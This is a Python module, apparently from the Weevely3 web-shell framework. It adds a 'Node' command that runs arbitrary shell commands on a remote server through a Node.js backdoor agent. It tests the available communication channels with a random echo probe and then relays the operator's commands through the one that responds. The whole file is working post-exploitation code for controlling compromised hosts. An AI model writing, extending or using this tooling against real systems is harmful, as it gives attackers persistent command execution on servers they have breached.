import random

from weevely.core import config
from weevely.core.channels.channel import Channel
from weevely.core.loggers import log
from weevely.core.module import Module
from weevely.core.module import Status


class Node(Module):
    """Execute system commands via Node.js agent."""

    def init(self):
        self.register_info({"author": ["Weevely3 Team"], "license": "GPLv3"})

        self.register_arguments(
            [
                {"name": "command", "help": "Shell command to execute", "nargs": "+"},
            ]
        )

        self.channel = None

    def _check_interpreter(self, channel):
        rand = str(random.randint(11111, 99999))
        command = "echo %s" % rand
        response, code, error = channel.send(command)

        if response and rand in response.decode("utf-8"):
            status = Status.RUN
        else:
            status = Status.IDLE

        return status

    def setup(self):
        if self.session.get("channel"):
            channels = [self.session["channel"]]
        else:
            channels = config.channels

        for channel_name in channels:
            channel = Channel(channel_name=channel_name, session=self.session)
            status = self._check_interpreter(channel)
            if status == Status.RUN:
                self.session["channel"] = channel_name
                self.channel = channel
                break

        return status

    def run(self, **kwargs):
        if self.session.get("shell_node", {}).get("status") != Status.RUN:
            self.setup()

        command = " ".join(self.args["command"])
        log.debug("PAYLOAD %s" % command)
        response, code, error = self.channel.send(command, **kwargs)
        return response.decode("utf-8", "replace") if response else ""
